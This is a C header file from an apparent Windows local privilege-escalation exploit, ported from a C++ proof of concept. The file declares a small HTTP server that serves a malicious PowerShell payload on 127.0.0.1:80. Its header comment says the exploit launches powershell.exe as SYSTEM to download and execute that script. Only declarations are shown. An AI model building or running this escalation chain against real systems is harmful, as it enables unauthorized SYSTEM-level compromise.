#pragma once

/**
	This module is a plain C class emulation. The POC written by decoder was in cpp and used some classes
	in  particular for the local negotiator.
	See https://stackoverflow.com/questions/40992945/convert-a-cpp-class-cpp-file-into-a-c-structure-c-file
	for how I emulated a class in pure C.

	This class defines the powershell delivery service and inherits from service.c (methods and arguments).
	The purpose of this exploit is to launch powershell.exe as SYSTEM and pass it as argument a command
	line for downloading and executing a ps script (generated in powershell.c) at 127.0.0.1:80. This
	class is in charge of listening on port 80 in order to serve the malicious powershell payload.
*/

struct _powershellServer;

typedef void(*pwshellServerConstructor) (struct _powershellServer*, char*, char*, BOOL);
typedef void(*pwshellServerDestructor) (struct _powershellServer*);
typedef void(*pwshellSocketStop) (struct _powershellServer*, char*);

typedef struct _powershellServer
{
	// Methods as pointer to functions
	pwshellServerConstructor construct;
	pwshellServerDestructor destruct;
	pwshellSocketStop socketError;

	// Arguments
	Server baseServer;  // This is a pointer to a service object (service.c)
} powershellServer;

// Entry point
void handlePowershellDeliveryService(char* powershellPayload);

// Constructor and destructor
void initPowershellService(powershellServer* this, char* listen_address, char* listen_port, BOOL debug);
void destructPowershellService(powershellServer* this);

// Emulated class Methods
static void handleHTTPConnection(powershellServer* this, char* powershellPayload);
static void pwshellSocketError(powershellServer* this, char* error_message);
static char* forgePowershellDeliveryPacket(char* powershellPayload, BOOL debug);